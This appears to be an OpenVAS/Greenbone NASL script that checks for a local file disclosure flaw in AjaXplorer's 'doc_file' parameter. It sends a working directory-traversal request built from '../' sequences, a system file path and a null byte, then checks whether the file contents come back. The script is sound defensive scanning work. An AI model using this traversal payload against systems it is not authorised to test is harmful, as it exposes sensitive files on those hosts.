if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103422" );
	script_bugtraq_id( 51960 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:P/A:N" );
	script_name( "AjaXplorer 'doc_file' Parameter Local File Disclosure Vulnerability" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-02-15 12:40:42 +0100 (Wed, 15 Feb 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_AjaXplorer_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "AjaXplorer/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51960" );
	script_xref( name: "URL", value: "http://ajaxplorer.info/ajaxplorer-4-0-2/" );
	script_xref( name: "URL", value: "http://www.ajaxplorer.info" );
	script_tag( name: "impact", value: "Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local text files on computers
  running the vulnerable application. This may aid in further attacks." );
	script_tag( name: "affected", value: "AjaXplorer 4.0.1 is vulnerable, other versions are also affected." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more details." );
	script_tag( name: "summary", value: "AjaXplorer is prone to a local file-disclosure vulnerability because
  it fails to adequately validate user-supplied input." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
CPE = "cpe:/a:ajaxplorer:ajaxplorer";
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/index.php?get_action=display_doc&doc_file=", crap( data: "../", length: 6 * 9 ), files[file], "%00" );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

